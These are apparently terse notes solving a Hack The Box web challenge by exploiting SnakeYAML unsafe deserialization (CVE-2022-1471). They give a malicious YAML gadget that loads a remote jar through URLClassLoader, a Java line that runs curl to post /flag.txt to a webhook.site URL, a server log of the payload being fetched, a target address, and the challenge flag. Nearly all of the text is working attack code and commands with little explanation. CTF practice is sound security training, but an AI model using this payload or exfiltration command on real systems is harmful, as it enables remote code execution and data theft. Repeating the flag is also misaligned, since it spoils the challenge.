'''
https://www.youtube.com/watch?v=MdxJ_iVvm6g
Review Code, google snakeyaml deserialization exploit
https://snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/
https://github.com/artsploit/yaml-payload

vi src/artsploit/AwesomeScriptEngineFactory.java
Runtime.getRuntime().exec("curl -d @/flag.txt https://webhook.site/8666824a-f486-4a8e-af63-6a991571e7fd");

<IPS IP>
python2 -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...
        83.136.254.139 - - [18/Jul/2023 11:53:08] "GET /yaml-payload.jar HTTP/1.1" 200 -

http://83.136.254.139:41930/update.html

foo: !!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://<My IPS IP>/yaml-payload.jar"]
  ]]
]

Web Hook:
https://webhook.site/
HTB{r1d3_th3_sn4k3}
'''
